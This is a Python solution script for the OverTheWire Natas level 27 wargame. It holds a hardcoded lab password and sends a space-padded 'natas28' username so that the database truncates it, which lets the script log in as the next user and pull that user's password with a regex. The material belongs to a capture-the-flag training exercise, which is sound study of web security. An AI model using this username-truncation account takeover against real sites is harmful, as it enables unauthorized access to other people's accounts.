import requests
import re,time

username ='natas27'
password ='55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ'

url = 'http://%s.natas.labs.overthewire.org/' %username
session = requests.Session()
data={"username":"natas28"+" "*58+"anythin","password":"anything"}
responce = requests.post(url,auth=(username,password),data=data)
content=responce.text
print(content)

# time.sleep(5)
data={"username":"natas28","password":"anything"}
responce = requests.post(url,auth=(username,password),data=data)
content=responce.text
print(content)
print("password for natas28 = "+ re.findall("natas28\n    \[password\] =\&gt\; (.*)",content)[0])